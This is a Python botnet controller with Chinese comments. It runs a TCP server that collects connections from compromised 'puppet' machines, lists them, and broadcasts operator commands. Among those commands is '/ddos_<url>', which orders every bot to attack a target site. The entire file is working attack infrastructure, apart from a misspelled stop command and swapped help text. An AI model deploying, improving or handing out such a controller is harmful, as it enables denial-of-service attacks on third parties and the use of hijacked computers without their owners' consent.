# 控制所有傀儡 发送总攻信息
from socket import *
import threading

address = '192.168.1.101'
port = 5000
buffsize = 512
s = socket(AF_INET, SOCK_STREAM)
s.bind((address, port))
s.listen(5)  # 最大排队连接数
datasock_list = []  # 机器列表


# 保持连接
def tcplink(sock, address):
    imgcounter = 0
    while True:
        try:
            recvdata = sock.recv(buffsize).decode('utf-8')
            print(f'\n {address}: {recvdata} \n')
            # sock.close()
            # datasock_list.remove(sock)
            if not recvdata:
                break
        except:
            sock.close()
            datasock_list.remove(sock)
            break
    imgcounter += 1

# 启动sock
def run():
    while True:
        clientsock, clientaddress = s.accept()
        if clientsock not in datasock_list:
            datasock_list.append(clientsock)
        threading.Thread(target=tcplink, args=(clientsock, clientaddress)).start()


# 发送指令
def send(com):
    for i in datasock_list:
        i.sendall(com.encode('utf-8'))

# 输入指令
def post_cmd():
    while True:
        command = input('Bojaka: >>> ')
        if command == '/ol':
            print(f'在线{len(datasock_list)}台')
        elif command == '/ls':
            if len(datasock_list) < 1:
                print('暂无机器在线')
            else:
                for i in datasock_list:
                    print(i)
        elif command.split('_')[0] == '/ddos':
            ok = input('确定向 ( ' + command.split('_')[1] + ' ) 发起进攻吗?(y,n) >>>')
            if ok == 'y':
                send(command)
            else:
                print('取消攻击')
        elif command == '/sotp_ddos':
            send(command)
        elif command.split('=')[0] == '/msg':
            send(command)
        elif command == '/help':
            print('''
                查看傀儡数量 /ls
                列出傀儡信息 /ol
                发起攻击指令 /ddos_http://....
            ''')
        else:
            print('未知指令 您可以输入/help接受指引')


if __name__ == '__main__':
    threading.Thread(target=run, args=()).start()
    threading.Thread(target=post_cmd, args=()).start()
